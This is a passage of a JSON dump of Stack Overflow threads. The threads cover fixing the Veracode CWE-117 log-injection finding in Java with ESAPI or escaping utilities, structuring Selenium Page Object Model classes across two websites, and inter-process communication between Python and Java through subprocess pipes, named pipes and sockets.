parameters plus the user ID, user's source IP, a logging\n * specific session ID, and the current date/time.\n *\n * It will only log the message if the current logging level is enabled, otherwise it will\n * discard the message.\n *\n * @param level defines the set of recognized logging levels (TRACE, INFO, DEBUG, WARNING, ERROR, FATAL)\n * @param type the type of the event (SECURITY SUCCESS, SECURITY FAILURE, EVENT SUCCESS, EVENT FAILURE)\n * @param message the message to be logged\n * @param throwable the {@code Throwable} from which to generate an exception stack trace.\n */\nprivate void log(Level level, EventType type, String message, Throwable throwable) {\n\n    // Check to see if we need to log.\n    if (!isEnabledFor(level)) {\n        return;\n    }\n\n    // ensure there's something to log\n    if (message == null) {\n        message = \"\";\n    }\n\n    // ensure no CRLF injection into logs for forging records\n    String clean = message.replace('\\n', '_').replace('\\r', '_');\n    if (ESAPI.securityConfiguration().getLogEncodingRequired()) {\n        clean = ESAPI.encoder().encodeForHTML(message);\n        if (!message.equals(clean)) {\n            clean += \" (Encoded)\";\n        }\n    }\n\n    // log server, port, app name, module name -- server:80/app/module\n    StringBuilder appInfo = new StringBuilder();\n    if (ESAPI.currentRequest() != null &amp;&amp; logServerIP) {\n        appInfo.append(ESAPI.currentRequest().getLocalAddr()).append(\":\").append(ESAPI.currentRequest().getLocalPort());\n    }\n    if (logAppName) {\n        appInfo.append(\"/\").append(applicationName);\n    }\n    appInfo.append(\"/\").append(getName());\n\n    //get the type text if it exists\n    String typeInfo = \"\";\n    if (type != null) {\n        typeInfo += type + \" \";\n    }\n\n    // log the message\n    // Fix for https://code.google.com/p/owasp-esapi-java/issues/detail?id=268\n    // need to pass callerFQCN so the log is not generated as if it were always generated from this wrapper class\n    log(Log4JLogger.class.getName(), level, \"[\" + typeInfo + getUserInfo() + \" -&gt; \" + appInfo + \"] \" + clean, throwable);\n}\n</code></pre>\n\n<p>See lines 398-453.  That's all the escaping that ESAPI provides.  I would suggest copying the unit tests as well.  </p>\n\n<p>[DISCLAIMER]:  I am project co-lead on ESAPI.  </p>\n\n<p>[1]: <a href=\"https://www.owasp.org/index.php/OWASP_Java_Encoder_Project\" rel=\"noreferrer\">https://www.owasp.org/index.php/OWASP_Java_Encoder_Project</a> and make sure your inputs are properly encoded when going into logging statements--every bit as much as when you're sending input back to the user.  </p>\n"},{"tags":[],"owner":{"account_id":6317063,"reputation":79,"user_id":4906610,"display_name":"Arpit Pandey"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1562251967,"creation_date":1562251967,"answer_id":56890404,"question_id":44949254,"body_markdown":"Though I am a bit late but I think it would help those who do not want to use ESAPI library and facing issue only for exception handler class\r\n\r\nUse apache commons library \r\n\r\n    import org.apache.commons.lang3.exception.ExceptionUtils;\r\n    LOG.error(ExceptionUtils.getStackTrace(ex));\r\n","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<p>Though I am a bit late but I think it would help those who do not want to use ESAPI library and facing issue only for exception handler class</p>\n\n<p>Use apache commons library </p>\n\n<pre><code>import org.apache.commons.lang3.exception.ExceptionUtils;\nLOG.error(ExceptionUtils.getStackTrace(ex));\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6779571,"reputation":302,"user_id":5220351,"display_name":"Vishwas Upadhyay"},"down_vote_count":1,"up_vote_count":10,"is_accepted":false,"score":9,"last_activity_date":1683721359,"creation_date":1572431777,"answer_id":58623439,"question_id":44949254,"body_markdown":"I am new to Veracode and was facing CWE-117. I understood this error is raised by Veracode when your logger statement has the potential to get attacked via malicious request&#39;s parameter values passed in. So we need to removed /r and /n (CRLF) from variables that are getting used in the logger statement.\r\n     \r\nMost of the newbie will wonder what method should be used to remove CRLF from variable passed in logger statement. Also sometime replaceAll() will not work as it is not an approved method by Veracode. \r\n \r\nIn my case I have used org.springframework.web.util.HtmlUtils.htmlEscape and it resolved the problem.  \r\n\r\n    private static final Logger LOG = LoggerFactory.getLogger(MemberController.class);\r\n    //problematic logger statement \r\n    LOG.info(&quot;brand {}, country {}&quot;,brand,country);\r\n    //Correct logger statement\r\n    LOG.info(&quot;brand {}, country {}&quot;,org.springframework.web.util.HtmlUtils.htmlEscape(brand),org.springframework.web.util.HtmlUtils.htmlEscape(country));\r\n\r\n**Edit-1:** Veracode has stopped suggesting any particular function/method for sanitization of the logger variable. However still above solution will work. Find out the below link suggested by Veracode which explains what to do and how to do it to fix CWE-117 for some languages.\r\n\r\nhttps://community.veracode.com/s/article/How-to-Fix-CWE-117-Improper-Output-Neutralization-for-Logs  \r\n\r\n**JAVA:** Using ESAPI library from OWASP for the logger. Checkout more details in link https://www.veracode.com/security/java/cwe-117 ","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<p>I am new to Veracode and was facing CWE-117. I understood this error is raised by Veracode when your logger statement has the potential to get attacked via malicious request's parameter values passed in. So we need to removed /r and /n (CRLF) from variables that are getting used in the logger statement.</p>\n<p>Most of the newbie will wonder what method should be used to remove CRLF from variable passed in logger statement. Also sometime replaceAll() will not work as it is not an approved method by Veracode.</p>\n<p>In my case I have used org.springframework.web.util.HtmlUtils.htmlEscape and it resolved the problem.</p>\n<pre><code>private static final Logger LOG = LoggerFactory.getLogger(MemberController.class);\n//problematic logger statement \nLOG.info(&quot;brand {}, country {}&quot;,brand,country);\n//Correct logger statement\nLOG.info(&quot;brand {}, country {}&quot;,org.springframework.web.util.HtmlUtils.htmlEscape(brand),org.springframework.web.util.HtmlUtils.htmlEscape(country));\n</code></pre>\n<p><strong>Edit-1:</strong> Veracode has stopped suggesting any particular function/method for sanitization of the logger variable. However still above solution will work. Find out the below link suggested by Veracode which explains what to do and how to do it to fix CWE-117 for some languages.</p>\n<p><a href=\"https://community.veracode.com/s/article/How-to-Fix-CWE-117-Improper-Output-Neutralization-for-Logs\" rel=\"nofollow noreferrer\">https://community.veracode.com/s/article/How-to-Fix-CWE-117-Improper-Output-Neutralization-for-Logs</a></p>\n<p><strong>JAVA:</strong> Using ESAPI library from OWASP for the logger. Checkout more details in link <a href=\"https://www.veracode.com/security/java/cwe-117\" rel=\"nofollow noreferrer\">https://www.veracode.com/security/java/cwe-117</a></p>\n"},{"tags":[],"owner":{"account_id":1344426,"reputation":1432,"user_id":1285431,"accept_rate":41,"display_name":"mzzzzb"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1588264408,"creation_date":1588264408,"answer_id":61528311,"question_id":44949254,"body_markdown":"If you are using Logback use the [replace](http://logback.qos.ch/manual/layouts.html#replace) function in your logback config pattern\r\n\r\noriginal pattern \r\n\r\n    &lt;pattern&gt;%d %level %logger : %msg%n&lt;/pattern&gt;\r\n\r\nwith replace\r\n\r\n    &lt;pattern&gt;%d %level %logger : %replace(%msg){&#39;[\\r\\n]&#39;, &#39;_&#39;} %n&lt;/pattern&gt;\r\n\r\nif you want to strip `&lt;script&gt;` tag as well\r\n\r\n    &lt;pattern&gt;%d %-5level %logger : %replace(%msg){&#39;[\\r\\n]|&amp;lt;script&#39;, &#39;_&#39;} %n&lt;/pattern&gt;\r\n\r\nThis way you dont need to to modify individual log statements. \r\n","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<p>If you are using Logback use the <a href=\"http://logback.qos.ch/manual/layouts.html#replace\" rel=\"nofollow noreferrer\">replace</a> function in your logback config pattern</p>\n\n<p>original pattern </p>\n\n<pre><code>&lt;pattern&gt;%d %level %logger : %msg%n&lt;/pattern&gt;\n</code></pre>\n\n<p>with replace</p>\n\n<pre><code>&lt;pattern&gt;%d %level %logger : %replace(%msg){'[\\r\\n]', '_'} %n&lt;/pattern&gt;\n</code></pre>\n\n<p>if you want to strip <code>&lt;script&gt;</code> tag as well</p>\n\n<pre><code>&lt;pattern&gt;%d %-5level %logger : %replace(%msg){'[\\r\\n]|&amp;lt;script', '_'} %n&lt;/pattern&gt;\n</code></pre>\n\n<p>This way you dont need to to modify individual log statements. </p>\n"},{"tags":[],"owner":{"account_id":18638595,"reputation":21,"user_id":13584910,"display_name":"div11"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1590007121,"creation_date":1590007121,"answer_id":61922460,"question_id":44949254,"body_markdown":"In order to avoid Veracode CWE 117 vulnerability I have used a custom logger class which uses HtmlUtils.htmlEscape() function to mitigate the vulnerablity.\r\nRecommended solution to this problem by Veracode is to use ESAPI loggers but if you dont want to add an extra dependency to your project this should work fine. \r\nhttps://github.com/divyashree11/VeracodeFixesJava/blob/master/spring-annotation-logs-demo/src/main/java/com/spring/demo/util/CustomLogger.java\r\n","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<p>In order to avoid Veracode CWE 117 vulnerability I have used a custom logger class which uses HtmlUtils.htmlEscape() function to mitigate the vulnerablity.\nRecommended solution to this problem by Veracode is to use ESAPI loggers but if you dont want to add an extra dependency to your project this should work fine. \n<a href=\"https://github.com/divyashree11/VeracodeFixesJava/blob/master/spring-annotation-logs-demo/src/main/java/com/spring/demo/util/CustomLogger.java\" rel=\"nofollow noreferrer\">https://github.com/divyashree11/VeracodeFixesJava/blob/master/spring-annotation-logs-demo/src/main/java/com/spring/demo/util/CustomLogger.java</a></p>\n"},{"tags":[],"owner":{"account_id":13418212,"reputation":153,"user_id":9681942,"display_name":"Margi212"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1646373174,"creation_date":1645096715,"answer_id":71157157,"question_id":44949254,"body_markdown":"I have tried with **HtmlEscape** of **org.springframework.web.util.HtmlUtils**, but it did **not resolve** by veracode&#39;s vulnerability. Give a try to below solution.\r\n\r\nFor Java use:\r\n\r\n    StringEscapeUtils.escapeJava(str)\r\n\r\nFor Html/JSP use:\r\n\r\n    StringEscapeUtils.escapeHtml(str)\r\n\r\nPlease use below package:\r\n\r\n    import org.appache.commons.lang.StringEscapeUtils;","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<p>I have tried with <strong>HtmlEscape</strong> of <strong>org.springframework.web.util.HtmlUtils</strong>, but it did <strong>not resolve</strong> by veracode's vulnerability. Give a try to below solution.</p>\n<p>For Java use:</p>\n<pre><code>StringEscapeUtils.escapeJava(str)\n</code></pre>\n<p>For Html/JSP use:</p>\n<pre><code>StringEscapeUtils.escapeHtml(str)\n</code></pre>\n<p>Please use below package:</p>\n<pre><code>import org.appache.commons.lang.StringEscapeUtils;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":11794139,"reputation":664,"user_id":8629258,"display_name":"Sabesan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1679328751,"creation_date":1679327832,"answer_id":75792559,"question_id":44949254,"body_markdown":"To use the Apache Commons Lang 3.12.0 library in your project, add the following dependency to your Gradle build file:\r\n``` python\r\nimplementation &#39;org.apache.commons:commons-lang3:3.12.0&#39;\r\n```\r\nIf you are using Maven, add the following dependency to your `pom.xml` file:\r\n``` xml\r\n&lt;dependency&gt;\r\n    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;\r\n    &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;\r\n    &lt;version&gt;3.12.0&lt;/version&gt;\r\n&lt;/dependency&gt;\r\n```\r\nAfter adding the dependency, you can use the `StringEscapeUtils.escapeJava()` method to escape special characters in a Java string. To use this method, import the following package:\r\n\r\n``` Java\r\nimport static org.apache.commons.lang3.StringEscapeUtils.escapeJava;;\r\n```\r\nThen, call the `escapeJava()` method with the string you want to escape:\r\n```Java\r\nString escapedString = escapeJava(myString);\r\n```\r\nThis method replaces any special characters in the input string with their corresponding escape sequences, making the string safe for use in Java code or data formats such as JSON or XML. By using this method from the Apache Commons Lang library, you can save time and ensure correctness in your string manipulation code.","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<p>To use the Apache Commons Lang 3.12.0 library in your project, add the following dependency to your Gradle build file:</p>\n<pre class=\"lang-py prettyprint-override\"><code>implementation 'org.apache.commons:commons-lang3:3.12.0'\n</code></pre>\n<p>If you are using Maven, add the following dependency to your <code>pom.xml</code> file:</p>\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;\n    &lt;version&gt;3.12.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>After adding the dependency, you can use the <code>StringEscapeUtils.escapeJava()</code> method to escape special characters in a Java string. To use this method, import the following package:</p>\n<pre><code>import static org.apache.commons.lang3.StringEscapeUtils.escapeJava;;\n</code></pre>\n<p>Then, call the <code>escapeJava()</code> method with the string you want to escape:</p>\n<pre><code>String escapedString = escapeJava(myString);\n</code></pre>\n<p>This method replaces any special characters in the input string with their corresponding escape sequences, making the string safe for use in Java code or data formats such as JSON or XML. By using this method from the Apache Commons Lang library, you can save time and ensure correctness in your string manipulation code.</p>\n"}],"owner":{"account_id":3195747,"reputation":852,"user_id":2698960,"accept_rate":83,"display_name":"Vitaliy Borisok"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":55910,"favorite_count":0,"down_vote_count":0,"up_vote_count":28,"accepted_answer_id":44958832,"answer_count":7,"score":28,"last_activity_date":1683721359,"creation_date":1499345065,"question_id":44949254,"body_markdown":"There is an Spring global ``@ExceptionHandler(Exception.class)`` method which logs exception like that:\r\n\r\n    @ExceptionHandler(Exception.class)\r\n    void handleException(Exception ex) {\r\n        logger.error(&quot;Simple error message&quot;, ex);\r\n    ...\r\n\r\nVeracode scan says that this logging has ``Improper Output Neutralization for Logs`` and suggest to use ESAPI logger. Is there any way how to fix this vulnerability without changing logger to ESAPI? This is the only place in code where I faced this issue and I try to figure out how to fix it with minimum changes. Maybe ESAPI has some methods I haven&#39;t noticed?\r\n\r\nP.S. Current logger is Log4j over slf4j\r\n\r\n**UPD:**\r\nIn the end I used ESAPI logger. I thought it wouldn&#39;t use my default logging service, but I was wrong and it simply used my slf4j logger interface with appropriate configuration.\r\n\r\n    private static final Logger logger = ESAPI.getLogger(MyClass.class);\r\n    ...\r\n    logger.error(null, &quot;Simple error message&quot;, ex);\r\n\r\nESAPI has extension of log4j logger and logger factory. It can be configured what to use in ESAPI.properties. For example:\r\n\r\n    ESAPI.Logger=org.owasp.esapi.reference.Log4JLogFactory\r\n","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<p>There is an Spring global <code>@ExceptionHandler(Exception.class)</code> method which logs exception like that:</p>\n\n<pre><code>@ExceptionHandler(Exception.class)\nvoid handleException(Exception ex) {\n    logger.error(\"Simple error message\", ex);\n...\n</code></pre>\n\n<p>Veracode scan says that this logging has <code>Improper Output Neutralization for Logs</code> and suggest to use ESAPI logger. Is there any way how to fix this vulnerability without changing logger to ESAPI? This is the only place in code where I faced this issue and I try to figure out how to fix it with minimum changes. Maybe ESAPI has some methods I haven't noticed?</p>\n\n<p>P.S. Current logger is Log4j over slf4j</p>\n\n<p><strong>UPD:</strong>\nIn the end I used ESAPI logger. I thought it wouldn't use my default logging service, but I was wrong and it simply used my slf4j logger interface with appropriate configuration.</p>\n\n<pre><code>private static final Logger logger = ESAPI.getLogger(MyClass.class);\n...\nlogger.error(null, \"Simple error message\", ex);\n</code></pre>\n\n<p>ESAPI has extension of log4j logger and logger factory. It can be configured what to use in ESAPI.properties. For example:</p>\n\n<pre><code>ESAPI.Logger=org.owasp.esapi.reference.Log4JLogFactory\n</code></pre>\n"},{"tags":["java","oop","selenium-webdriver","inheritance","multiple-inheritance"],"owner":{"account_id":28568106,"reputation":1,"user_id":21870711,"display_name":"emma908"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":25,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683721090,"creation_date":1683721090,"question_id":76218328,"body_markdown":"For a selenium POM project, I am using two different websites. Each website have pages with common functionality and variables, for example splash screens, headers, etc, but the values themselves are different. I currently have a BasePage with common objects, like PageActions (which has all of the clicking and entering text functionality etc) and URL. All pages extend BasePage. \r\n\r\n\r\n\r\nI want to now further refactor the classes, one way I thought of would be to have a Base Page for website 1 that extends BasePage and another Base Page for website 2 that also extends BasePage. Then, pages of website 1 would extend Base Page for website 1. \r\nIs there a better way to organise this, maybe using abstract classes? ","title":"Following Page Object Model how should I structure classes if I have multiple websites?","body":"<p>For a selenium POM project, I am using two different websites. Each website have pages with common functionality and variables, for example splash screens, headers, etc, but the values themselves are different. I currently have a BasePage with common objects, like PageActions (which has all of the clicking and entering text functionality etc) and URL. All pages extend BasePage.</p>\n<p>I want to now further refactor the classes, one way I thought of would be to have a Base Page for website 1 that extends BasePage and another Base Page for website 2 that also extends BasePage. Then, pages of website 1 would extend Base Page for website 1.\nIs there a better way to organise this, maybe using abstract classes?</p>\n"},{"tags":["java","python","ipc","multiprocessing","multiple-processes"],"comments":[{"owner":{"account_id":10930,"reputation":781791,"user_id":20862,"accept_rate":50,"display_name":"Ignacio Vazquez-Abrams"},"score":0,"creation_date":1280344777,"post_id":3356554,"comment_id":3485335,"body_markdown":"Can you load the Java classes independently of starting the GUI?","body":"Can you load the Java classes independently of starting the GUI?"},{"owner":{"account_id":74500,"reputation":6395,"user_id":214035,"accept_rate":84,"display_name":"Adam Fraser"},"score":0,"creation_date":1280415842,"post_id":3356554,"comment_id":3493976,"body_markdown":"yes, I&#39;ve got a wrapper using JNI","body":"yes, I&#39;ve got a wrapper using JNI"}],"answers":[{"tags":[],"owner":{"account_id":9458,"reputation":17538,"user_id":17498,"accept_rate":77,"display_name":"Vebjorn Ljosa"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1280346071,"creation_date":1280346071,"answer_id":3356784,"question_id":3356554,"body_markdown":"Use [subprocess.Popen][1] to start the Java process and establish pipes to communicate with it.  For serializing and deserializing data efficiently in a language-neutral, platform-neutral, extensible way, take a look at [Protocol Buffers][2] (contributed to by [Jon Skeet][3]!).\r\n\r\n\r\n  [1]: http://docs.python.org/library/subprocess.html\r\n  [2]: http://code.google.com/p/protobuf/\r\n  [3]: https://stackoverflow.com/users/22656/jon-skeet","title":"IPC (inter process communication) between python and java","body":"<p>Use <a href=\"http://docs.python.org/library/subprocess.html\" rel=\"nofollow noreferrer\">subprocess.Popen</a> to start the Java process and establish pipes to communicate with it.  For serializing and deserializing data efficiently in a language-neutral, platform-neutral, extensible way, take a look at <a href=\"http://code.google.com/p/protobuf/\" rel=\"nofollow noreferrer\">Protocol Buffers</a> (contributed to by <a href=\"https://stackoverflow.com/users/22656/jon-skeet\">Jon Skeet</a>!).</p>\n"},{"tags":[],"owner":{"account_id":11325,"reputation":17940,"user_id":21776,"display_name":"Jeremy Brown"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1280346378,"creation_date":1280346378,"answer_id":3356827,"question_id":3356554,"body_markdown":"[Named pipes][1] could be the answer for you.  See:  [Create a temporary FIFO (named pipe) in Python?][2]\r\n\r\n\r\n  [1]: http://docs.python.org/library/os.html#os.mkfifo\r\n  [2]: https://stackoverflow.com/questions/1430446/create-a-temporary-fifo-named-pipe-in-python","title":"IPC (inter process communication) between python and java","body":"<p><a href=\"http://docs.python.org/library/os.html#os.mkfifo\" rel=\"nofollow noreferrer\">Named pipes</a> could be the answer for you.  See:  <a href=\"https://stackoverflow.com/questions/1430446/create-a-temporary-fifo-named-pipe-in-python\">Create a temporary FIFO (named pipe) in Python?</a></p>\n"},{"tags":[],"owner":{"account_id":74500,"reputation":6395,"user_id":214035,"accept_rate":84,"display_name":"Adam Fraser"},"down_vote_count":0,"up_vote_count":5,"is_accepted":true,"score":5,"last_activity_date":1517385603,"creation_date":1285596030,"answer_id":3804547,"question_id":3356554,"body_markdown":"I attempted to code a solution using pipes but it seems that they just aren&#39;t well suited to sending multiple messages back and forth with potentially large data attached. Rather, they seem ideal for opening a &quot;worker&quot; style program that runs, responds, and dies.\r\n\r\nLooking into socket programming, I found a fantastic resource here: https://web.archive.org/web/20080913064702/http://www.prasannatech.net/2008/07/socket-programming-tutorial.html\r\n\r\nThe tutorial presents TCP and UDP variants of a simple chat program written in 4 languages. I ended up using and modifying the TCP Java client and Python server.","title":"IPC (inter process communication) between python and java","body":"<p>I attempted to code a solution using pipes but it seems that they just aren't well suited to sending multiple messages back and forth with potentially large data attached. Rather, they seem ideal for opening a \"worker\" style program that runs, responds, and dies.</p>\n\n<p>Looking into socket programming, I found a fantastic resource here: <a href=\"https://web.archive.org/web/20080913064702/http://www.prasannatech.net/2008/07/socket-programming-tutorial.html\" rel=\"nofollow noreferrer\">https://web.archive.org/web/20080913064702/http://www.prasannatech.net/2008/07/socket-programming-tutorial.html</a></p>\n\n<p>The tutorial presents TCP and UDP variants of a simple chat program written in 4 languages. I ended up using and modifying the TCP Java client and Python server.</p>\n"},{"tags":[],"owner":{"account_id":55220,"reputation":2409,"user_id":165305,"accept_rate":74,"display_name":"Kenn"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1373662849,"creation_date":1373662849,"answer_id":17623945,"question_id":3356554,"body_markdown":"This is the opensource solution Google uses to do IPC between Java and Python.\r\nhttps://code.google.com/p/protobuf/\r\n\r\nRecommended.","title":"IPC (inter process communication) between python and java","body":"<p>This is the opensource solution Google uses to do IPC between Java and Python.\n<a href=\"https://code.google.com/p/protobuf/\" rel=\"nofollow\">https://code.google.com/p/protobuf/</a></p>\n\n<p>Recommended.</p>\n"},{"tags":[],"owner":{"account_id":4912186,"reputation":6976,"user_id":3957182,"accept_rate":59,"display_name":"wandermonk"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1456365461,"creation_date":1456365461,"answer_id":35616834,"question_id":3356554,"body_markdown":"I had a similar situation where I had to communicate between a Java process and a Linux process. I used named pipes.\n\nTry mkfifo() implementation in python.","title":"IPC (inter process communication) between python and java","body":"<p>I had a similar situation where I had to communicate between a Java process and a Linux process. I used named pipes.</p>\n\n<p>Try mkfifo() implementation in python.</p>\n"},{"tags":[],"owner":{"account_id":3630530,"reputation":1231,"user_id":3026829,"accept_rate":50,"display_name":"Mr. A"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1584301885,"creation_date":1584301885,"answer_id":60696999,"question_id":3356554,"body_markdown":"IPC using `subprocess` from in python\r\n\r\n\r\n\r\nIPC.java file here java code will receive number and send square of it. \r\n\r\n    import java.util.Scanner;\r\n    \r\n    public class IPC {\r\n    \r\n        public static void main(String[] args) {\r\n    \t\tScanner scanner = new Scanner(System.in);\r\n    \t\tString data=&quot;&quot;;\r\n    \t\twhile(scanner.hasNext()){\r\n                // Receive data from Python code \r\n    \t\t    data = scanner.nextLine();\r\n\r\n                // Process data (calculate square)\r\n                int x = Integer.parseInt(data);\r\n                int square = x*x;\r\n                \r\n               \r\n                // Send data to python code\r\n    \t\t    System.out.println(square);\r\n    \t\t}\r\n    \t\tscanner.close();\r\n        }\r\n    }\r\n\r\n\r\nIPC.py file\r\n\r\n    import subprocess\r\n    subprocess.run([&quot;javac&quot;, &quot;IPC.java&quot;])\r\n    proc = subprocess.Popen([&quot;java&quot;, &quot;IPC&quot;], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\r\n    for i in range(10):\r\n        # Send to java code\r\n        proc.stdin.write(b&#39;%d\\n&#39; % i)\r\n        proc.stdin.flush()\r\n        proc.stdout.flush()\r\n\r\n        # Receive data from java code\r\n        output = proc.stdout.readline()\r\n        print (output.rstrip())\r\n    proc.communicate()\r\n\r\n","title":"IPC (inter process communication) between python and java","body":"<p>IPC using <code>subprocess</code> from in python</p>\n\n<p>IPC.java file here java code will receive number and send square of it. </p>\n\n<pre><code>import java.util.Scanner;\n\npublic class IPC {\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        String data=\"\";\n        while(scanner.hasNext()){\n            // Receive data from Python code \n            data = scanner.nextLine();\n\n            // Process data (calculate square)\n            int x = Integer.parseInt(data);\n            int square = x*x;\n\n\n            // Send data to python code\n            System.out.println(square);\n        }\n        scanner.close();\n    }\n}\n</code></pre>\n\n<p>IPC.py file</p>\n\n<pre><code>import subprocess\nsubprocess.run([\"javac\", \"IPC.java\"])\nproc = subprocess.Popen([\"java\", \"IPC\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\nfor i in range(10):\n    # Send to java code\n    proc.stdin.write(b'%d\\n' % i)\n    proc.stdin.flush()\n    proc.stdout.flush()\n\n    # Receive data from java code\n    output = proc.stdout.readline()\n    print (output.rstrip())\nproc.communicate()\n</code></pre>\n"},{"tags":[],"owner":{"account_id":22372905,"reputation":492,"user_id":16587692,"display_name":"Teodor Mihail"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683720998,"creation_date":1683670670,"answer_id":76213713,"question_id":3356554,"body_markdown":"# Inter-Process Communication between Python and Java #\r\n\r\n&lt;br&gt;\r\n&lt;br&gt;\r\n\r\n## Implementing a self-contained, System independent JRE in the Python application ##\r\n\r\n&lt;br&gt;\r\n\r\nIn order to make the Python application independent of the system as a whole, a JRE must be created inside the Python application. This must be done if it is desired that the application must not depend on the system and everything must be self-contained within the application. This is helpful if the application as a whole must be ready to run on any user&#39;s machine without any additional resources and procedures upon each installation.\r\n\r\n\r\nGo to https://learn.microsoft.com/en-us/java/openjdk/download, download the JDK for your desired hardware architecture and OS, and load it inside the Python application&#39;s environment. Afterwards put the Java application project as a whole or a ```.jar``` file made from the Java application within the Python application&#39;s directory.\r\n\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\nYou can then launch the Java application within the Python application as a sub-process. \r\n\r\n&lt;br&gt;\r\n&lt;br&gt;\r\n\r\n## Inter-Process communication methods ##\r\n\r\n&lt;br&gt;\r\n\r\n### Real-time Inter-Process Communication using *stdin*, *stout* and *stderr* ###\r\n\r\n&lt;br&gt;\r\n&lt;br&gt;\r\n\r\nThe ```stdin```,```stdout ```, and ```stderr``` streams are the main I/O systems that the OS kernel is using for applications and processes. By modifying the flow of these streams from child process to OS, to child process to parent process, these streams will be bypassed through the parent process and the parent process will have the ability to perform input and output operations directly with the child process\r\n\r\n&lt;br&gt;\r\n\r\n**[ Java Code ]**\r\n```\r\npublic class Main {\r\n\r\n    public static void main(String[] args)\r\n    {\r\n        // Send input over the &quot;stdout&quot; stream to the Python parent process\r\n        System.out.println(&quot;Message from Java application&quot;);\r\n        System.out.flush();\r\n\r\n        // Read input over the &quot;stdin&quot; stream from the Python parent process\r\n        Scanner s = new Scanner(System.in);\r\n        String input = s.nextLine();\r\n        s.close();\r\n\r\n        // Send input over the &quot;stdout&quot; stream to the Python parent process\r\n        System.out.println(input);\r\n        System.out.flush();\r\n    }\r\n}\r\n```\r\n\r\n**[ Python Code ]**\r\n\r\n```\r\nimport subprocess\r\n\r\n# Path to java.exe, in case the application contains a self-contained java environment, else just the &quot;java&quot; command\r\npath_to_java_exe = &quot;C:\\\\Users\\\\Teodor Mihail\\\\PycharmProjects\\\\Python_IPC\\\\jre\\\\bin\\\\java.exe&quot;\r\n\r\n# Command line argument that specifies the compiler what it should compile, in this case is a &quot;.jar&quot; file\r\njava_exe_arguments = &quot;-jar&quot;\r\n\r\n# The path to the file that the compiler will run and the runtime will execute, in this case it is the whole program compiled as a &quot;.jar&quot; file\r\njava_jar_file_path = &quot;C:\\\\Users\\\\Teodor Mihail\\\\PycharmProjects\\\\Python_IPC\\\\Java_I.P.C.jar&quot;\r\n\r\n# Global variable that holds the sub-process\r\nprocess = None\r\n\r\n\r\n\r\n\r\ndef subprocess_startup():\r\n    # Specify that the &quot;process&quot; variable is a reference to the global variable &quot;process&quot;\r\n    global process\r\n\r\n    # Open the process and redirect the &quot;stdin&quot;, &quot;stdout&quot;, and &quot;stderr&quot; streams from the sub-process to the OS to the Python process\r\n    process = subprocess.Popen([path_to_java_exe, java_exe_arguments, java_jar_file_path], stdin=subprocess.PIPE,\r\n                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n\r\n\r\ndef subprocess_read_stdout():\r\n    # Read the output sent by the Java application sub-process over the &quot;stdout&quot; stream\r\n    received = process.stdout.readline()\r\n    print(received)\r\n\r\n\r\ndef subprocess_write_stdin(data):\r\n    # Write input to the Java application over the &quot;stdin&quot; stream\r\n    process.stdin.write(data.encode(&quot;utf-8&quot;))\r\n    process.stdin.flush()\r\n\r\n\r\ndef main():\r\n    subprocess_startup()\r\n\r\n    # A loop can be implemented here for continuous read and write operations.\r\n    # Both the read and write operation methods can be open on different threads\r\n    # to perform continuous read and write operations executed in parallel\r\n\r\n\r\n    subprocess_read_stdout()\r\n\r\n    # Data to be written on the stdin stream must end in &quot;\\n&quot; otherwise the Java\r\n    # Scanner will lock. This will happen because the Scanner in Java is\r\n    # scanning until a &quot;\\n&quot; is found, otherwise it will wait indefinitely\r\n    # until it will find a &quot;\\n&quot; within the input stream.\r\n    subprocess_write_stdin(&quot;Message from Python application\\n&quot;)\r\n\r\n\r\n\r\n    subprocess_read_stdout()\r\n\r\n\r\nif __name__ == &#39;__main__&#39;:\r\n    main()\r\n\r\n```\r\n\r\nAt each ```process.stdin.write``` method call, the data sent to the child process must be terminated with a newline character (&quot;```\\n```&quot;). This must be done because the Java scanner will scan the ```stdin``` stream looking for a newline character, and because the stream is buffered, this will result into a lock on the thread on which this operation is performed.\r\n\r\n&lt;br&gt;\r\n&lt;br&gt;\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/yR5JX.png","title":"IPC (inter process communication) between python and java","body":"<h1>Inter-Process Communication between Python and 